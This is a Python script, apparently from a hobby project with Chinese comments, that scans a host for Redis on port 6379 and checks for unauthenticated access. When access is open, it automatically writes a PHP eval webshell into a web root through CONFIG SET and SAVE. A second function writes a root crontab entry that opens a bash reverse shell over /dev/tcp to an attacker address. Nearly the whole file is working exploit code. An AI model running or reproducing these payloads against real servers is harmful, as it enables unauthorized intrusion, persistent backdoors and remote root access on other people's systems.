# -*- coding: utf-8 -*-
# @Time    : 12 2月 2025 11:26 下午
# @Author  : codervibe
# @File    : redisScan.py
# @Project : pythonBasics

import socket
import redis

def scan_port(ip):
    """
    检查指定 IP 的 Redis 端口是否开放。

    :param ip: 需要扫描的 IP 地址
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)  # 设置超时时间
    try:
        s.connect((ip, 6379))  # 尝试连接到 Redis 默认端口 6379
        print(f"[+] {ip} 的 6379 端口上有 Redis 服务")
        s.close()
        check_redis_connect(ip)
    except socket.error:
        print("[-] 6379 端口已关闭")
        return

def check_redis_connect(ip):
    """
    检查指定 IP 的 Redis 是否存在未授权访问问题。

    :param ip: 需要检查的 IP 地址
    """
    try:
        # 尝试连接到指定IP地址的Redis服务器，设置超时时间为0.3秒
        r = redis.StrictRedis(host=ip, port=6379, socket_timeout=0.3)

        # 获取 Redis 服务器信息
        info = r.info()

        # 如果成功获取到服务器信息，说明存在未授权访问
        if info:
            print(f"[+] {ip}  存在未授权访问")
            print(f"[+] {r.client_list()}")

            # 调用exp_webShell函数，此处假设该函数用于利用漏洞部署webshell
            exp_webShell(r)
        else:
            print(f"[-] {ip} 不存在未授权访问")
    except redis.ConnectionError:
        # 如果无法连接到Redis服务器，捕获ConnectionError异常
        print(f"[-] 无法连接到 {ip}:6379")
        return

def exp_webShell(redis_client):
    """
    利用 Redis 未授权访问写入 webshell。

    :param redis_client: Redis 客户端对象
    """
    root = 'D:/phpstudy_pro/WWW'
    redis_client.config_set('dir', root)
    redis_client.config_set('dbfilename', 'shell.php')
    redis_client.set('x', "<?php @eval($_POST['hihack']);?>")
    redis_client.save()
    print(f"[+] webshell 写入成功")

def exp_crontab(redis_client):
    """
    利用 Redis 未授权访问创建恶意定时任务。

    :param redis_client: Redis 客户端对象
    """
    # 设置Redis数据目录为'/var/spool/cron'
    root = '/var/spool/cron'
    bounceIPAddress = ""
    # 配置Redis保存目录
    redis_client.config_set('dir', root)
    # 配置Redis数据文件名为'root'
    redis_client.config_set('dbfilename', 'root')
    # 设置定时任务执行命令
    redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/'+bounceIPAddress+'/8888 0>&1\n\n')
    # 保存配置和数据
    redis_client.save()
    # 打印成功创建定时任务的消息
    print(f"[+] 定时任务已创建")

